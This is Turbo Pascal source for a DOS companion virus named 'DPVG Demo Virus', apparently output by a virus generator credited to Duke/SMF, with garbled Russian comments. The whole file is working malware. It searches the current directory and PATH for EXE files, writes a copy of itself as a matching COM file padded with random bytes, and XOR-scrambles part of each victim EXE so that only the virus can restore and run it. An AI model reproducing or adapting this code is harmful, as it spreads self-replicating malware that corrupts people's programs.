   (* This file created with [DPVG] v0.20 generator (c) by Duke/SMF *)

   {$M 5000, 1000, 5000}
   {$S-,I-}  {íâ  áâà®ª  ¥®¡å®¤¨¬  ¤«ï ®¯â¨¬¨§ æ¨¨ ª®¤ }
   uses dos;
   const VirusSize= 6016 { *ã¦®¥ ¢¯¨á âì! };
         e='.EXE';
   var Author,VirusName,Generator:string;
       ds:dirstr;
       ns:namestr;
       es:extstr;
       f,g:file;
       VirusBody:array[1..VirusSize] of char;  {â¥«® ¢¨àãá }
       st:string;
       par:string;                             {¯ à ¬¥âàë ª®¬ ¤®© áâà®ª¨}
   {------------------}
   procedure Crypt(n:string);
   const CS=2000;
   var c:file;                                 {è¨äàã¥¬ë© ä ©«}
       attr:word;                              { âà¨¡ãâë ä ©« }
       t:array[1..CS] of byte;                 {è¨äàã¥¬ë© ¬ áá¨¢}
       ch:byte;
       i:integer;
   begin
   assign(c,n);
   getfattr(c,attr);                           {á®åà ï¥¬  âà¨¡ãâë}
   setfattr(c,$20);
   reset(c,1);
   seek(c,200);                                {¯à¨ª« ¤ë¢ ¥¬ £¥à®¨ç¥áª¨¥ ãá¨«¨ï}
   blockread(c,ch,1);                          { ¤«ï ¢ëç¨á«¥¨ï  ç «ì®© }
   for i:=1 to 10 do                           { ¯®§¨æ¨¨ è¨äà®¢ ¨ï ¦¥àâ¢ë}
     begin
     seek(c,ch+1);
     blockread(c,ch,1);
     end;
   seek(c,ch+300);
   blockread(c,t,CS);                          {ç¨â ¥¬ ªãá®ª ¨§ á¥à¥¤¨ë}
   for i:=1 to CS do t[i]:=t[i] xor 99;        {è¨äàã¥¬ íâ®â ªãá®ª}
   seek(c,ch+300);
   blockwrite(c,t,CS);                         {§ ¯¨áë¢ ¥¬ ªãá®ª}
   close(c);
   setfattr(c,attr);                           {¢®§¢à é ¥¬  âà¨¡ãâë}
   end;
   {------------------}
   procedure Infect(n:string);                 {¯à®æ¥¤ãà  § à ¦¥¨ï}
   var ch:char;
       i:integer;
   begin
   fsplit(n,ds,ns,es);
   st:=ds+ns+'.COM';
   assign(g,st);{$I-}reset(g,1);{$I+}          {*à®¢¥àï¥¬, ¥áâì «¨ ã¦¥ COM-ä ©«}
   if ioresult<>0 then                         {…á«¨ ¥â => ¥éñ ¥ § à ¦¥...}
     begin
     rewrite(g,1);                             {... á®§¤ ¥¬ ª®¬¯ ì®}
     blockwrite(g,VirusBody,VirusSize);        {... ¯¨è¥¬ ¢¨àãá}
   { ‘®§¤ ¥¬ ä ©«-¢¨àãá á«ãç ©®© ¤«¨ë: }
     for i:=1 to random(1000) do                {... ¯¨è¥¬ ¬ãá®à}
       begin
       ch:=chr(random(255));
       blockwrite(g,ch,1);
       end;
     Crypt(n);                                 {è¨äàã¥¬ ¦¥àâ¢ã}
     end;
   close(g);
   end;
   {------------------}
   procedure Find(p:string);
   {¯®¨áª ¯®â¥æ¨ «ìëå ¦¥àâ¢}
   var n:searchrec;
   begin
   findfirst(p+'*.exe',$21,N);
   while doserror=0 do
     begin
     if n.size>3000 then                       {¥á«¨ ¤«¨  ä ©«  ¡®«¥¥ 3000, â®}
     Infect(p+n.name);                           {¢ë§ë¢ ¥¬ § à ¦¥¨¥}
     findnext(n);                              {á®¢  ¨é¥¬...}
     end;
   end;
   {------------------}
   procedure Path(p:string);
   var t:integer;
   begin
   if p='' then exit;
   t:=pos(';',p);
   if t=0 then Find(p+'\')
          else begin
               Find(copy(p,1,t-1)+'\');
               Path(copy(p,t+1,length(p)-t));
               end;
   end;
   {------------------}
   procedure StartVirus;
   var i:byte;
   begin
   fsplit(paramstr(0),ds,ns,es);
   if es<>e then {¥á«¨ ¬ë ¥ ¢ exe-ä ©«¥,â® à ¡®â ¥¬ á exe}
     begin
     st:=ds+ns+e;
     assign(g,st);{$I-}reset(g);{$I+}
     if ioresult=0 then {¥á«¨  ©¤¥ ¯®à ¦¥ë© ä ©«,â® § ¯ãáª ¥¬ ¥£®}
       begin
       close(g);
       par:='';
       for i:=1 to paramcount do par:=par+paramstr(i)+' ';
       Crypt(st);                              {à áè¨äà®¢ë¢ ¥¬ ¦¥àâ¢ã}
       exec(st,par);                           {§ ¯ãáª ¥¬ ¦¥àâ¢ã}
       Crypt(st);                              {§ è¨äà®¢ë¢ ¥¬ ®¡à â® :)}
       end;
     end;
   Find('');
   Path(GetEnv('PATH'));
   end;
   {------------------}
   begin
   Author:='Duke/SMF';
   VirusName:='DPVG Demo Virus';
   Generator:='[DPVG v0.20]';
   assign(f,paramstr(0));
   reset(f,1);
   blockread(f,VirusBody,VirusSize);           {áç¨âë¢ ¥¬ ¢¨àãá ¢ ¯ ¬ïâì}
   close(f);
   Randomize;
   StartVirus;
   writeln;
   writeln('This is [DPVG v0.20] Demo Virus');
   writeln('Created (c) by Duke/SMF');
   end.
